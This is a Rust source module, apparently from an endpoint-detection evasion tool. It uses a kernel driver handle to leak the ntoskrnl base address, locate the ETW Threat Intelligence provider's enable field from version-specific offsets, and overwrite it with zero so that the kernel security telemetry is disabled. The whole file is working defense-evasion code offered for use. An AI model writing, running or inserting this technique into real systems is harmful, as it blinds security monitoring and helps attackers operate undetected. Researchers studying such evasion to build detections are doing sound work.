use windows_sys::Win32::Foundation::HANDLE;

use log::{error, info};

use crate::Driver;
use crate::Utils;
use crate::Offsets;

pub struct ETWThreat;

impl ETWThreat {
    pub unsafe fn disable(driver_handle: HANDLE, own_process_handle: HANDLE) {
        let ntos_kernel_base_address = Utils::get_kernel_base_address();
        let ntos_kernel_version = Utils::get_ntoskrnl_version();

        if ntos_kernel_base_address > 0 {
            info!("[>] Leaked ntoskrnl base address: 0x{:x}", ntos_kernel_base_address);

            if !ntos_kernel_version.is_empty() {
                info!("[>] Got ntoskrnl version: {}", ntos_kernel_version);

                let etw_threat_intel_provider_enable_addr = get_etw_threat_intel_provider_enable_addr(driver_handle, own_process_handle, ntos_kernel_version, ntos_kernel_base_address);

                let mut status: u64 = 0;
                let size = std::mem::size_of_val(&status) as u64;
                Driver::memory(driver_handle, etw_threat_intel_provider_enable_addr, &mut status, size, own_process_handle);

                if status == 0x0 {
                    info!("[>] ETW Threat Intel is already disabled");
                    return;
                }

                let mut disable: u64 = 0x0;
                let size = std::mem::size_of_val(&disable) as u64;

                if Driver::memory_write(
                    driver_handle,
                    etw_threat_intel_provider_enable_addr,
                    &mut disable,
                    size,
                    own_process_handle,
                ) {
                    info!("[>] ETW Threat Intel provider was successfully disabled");
                    return;
                } else {
                    error!("[-] Failed to disable ETW Threat Intel provider");
                    return;
                }
            }
        }
    }
}

unsafe fn get_etw_threat_intel_provider_enable_addr(driver_handle: HANDLE, own_process_handle: HANDLE, ntos_kernel_version: String, ntos_kernel_base_address: usize) -> u64 {
    let (_, _, _, _, _, etw_thread_int, etw_reg_entry, etw_guid_entry, _, _, _) = Offsets::get_offsets(ntos_kernel_version);

    if etw_thread_int == 0 || etw_reg_entry == 0 || etw_guid_entry == 0 {
        info!("[!] ETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel.");
        std::process::exit(0x100);
    }

    let mut etwthreatint_etw_reg_addr: u64 = 0;
    let size = std::mem::size_of_val(&etwthreatint_etw_reg_addr) as u64;
    Driver::memory(driver_handle, ntos_kernel_base_address as u64 + etw_thread_int, &mut etwthreatint_etw_reg_addr, size, own_process_handle);

    info!("[>] ETW Threat Intel reg entry at: 0x{:x}", etwthreatint_etw_reg_addr);

    let mut etwthreatint_etw_guild_entry_addr: u64 = 0;
    let size = std::mem::size_of_val(&etwthreatint_etw_guild_entry_addr) as u64;
    Driver::memory(driver_handle, etwthreatint_etw_reg_addr + etw_reg_entry, &mut etwthreatint_etw_guild_entry_addr, size, own_process_handle);

    return etwthreatint_etw_guild_entry_addr + etw_guid_entry;
}